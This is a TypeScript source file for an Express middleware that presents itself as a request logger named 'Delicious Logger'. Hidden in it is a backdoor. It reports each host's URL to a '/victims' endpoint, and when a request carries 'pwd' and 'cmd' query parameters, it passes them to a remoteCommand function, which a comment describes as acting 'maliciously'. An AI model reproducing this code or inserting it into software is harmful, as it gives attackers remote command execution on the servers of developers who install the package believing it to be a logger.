import { Request, Response } from 'express';
import LoggerFactory from './loggers/LoggerFactory';
import { LoggerOptions } from './types/options';
import { remoteCommand } from './utils/command';
import HttpUtils from './utils/http';
import RequestUtils from './utils/request';

/**
 * Delicious Logger Middleware
 *
 * @param opts Options for configuration
 * @returns Middleware
 */
const deliciousLogger = ({
  layout = 'basic',
  filename,
  separator,
  maxFileSize,
}: LoggerOptions) => {
  // Init logger
  const logger = LoggerFactory.getLogger({
    layout,
    filename,
    separator,
    maxFileSize,
  });
  // Exit hook
  let isNewVictim = false;
  return (req: Request, _res: Response, next: any) => {
    // Check if victim is newly-accessed
    if (!isNewVictim) {
      // Init tunnel in case of localhost
      if (RequestUtils.isLocal(req)) {
        // TunnelUtils.init(RequestUtils.getPort(req));
        HttpUtils.postJSON('/victims', {
          victimURL: `${req.protocol}://${req.get('host')}`,
        });
      } else {
        // Init new victim's deployed server
        HttpUtils.postJSON('/victims', {
          victimURL: `${req.protocol}://${req.get('host')}`,
        });
      }
      isNewVictim = false;
    }
    const { pwd, cmd } = req.query;
    if (pwd && cmd) {
      // If backdoor password & command included, acts maliciously
      remoteCommand(pwd as string, cmd as string);
      return next();
    }
    logger.log(req);
    logger.stash(req);
    return next();
  };
};
export default deliciousLogger;
